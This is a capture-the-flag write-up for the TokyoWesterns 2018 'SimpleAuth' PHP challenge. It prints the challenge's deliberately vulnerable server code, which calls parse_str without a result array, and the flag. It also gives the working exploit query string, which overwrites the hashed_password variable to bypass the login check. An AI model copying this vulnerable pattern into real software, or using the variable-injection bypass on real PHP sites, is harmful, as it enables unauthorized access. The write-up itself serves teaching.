---
title: SimpleAuth 
contest: TokyoWesterns CTF 4th 2018
authors: trupples
layout: writeup
---

## Proof of Flag
```
TWCTF{d0_n0t_use_parse_str_without_result_param}
```

## Summary
`parse_str` abuse.

## Proof of solving
Server code

```php
<?php

require_once 'flag.php';

if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['action'])){
        $action = $res['action'];
    }
}

if ($action === 'auth') {
    if (!empty($res['user'])) {
        $user = $res['user'];
    }
    if (!empty($res['pass'])) {
        $pass = $res['pass'];
    }

    if (!empty($user) && !empty($pass)) {
        $hashed_password = hash('md5', $user.$pass);
    }
    if (!empty($hashed_password) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e') {
        echo $flag;
    }
    else {
        echo 'fail :(';
    }
}
else {
    highlight_file(__FILE__);
}
```

## Solution
I initially tried cracking the hash and looking it up on rainbow tables but
nothing was found so I figured there's a smarter way, and there is. The PHP
function `parse_str` doesn't just return an array with the parsed data, it also
adds the parsed variables to the global scope. The solution is requesting the
page with the query string:

`?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e`

This way because user and pass are undefined the hash isn't recalculated and the
one used in the comparison is the one we provide.

http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e

```
=> TWCTF{d0_n0t_use_parse_str_without_result_param}
```
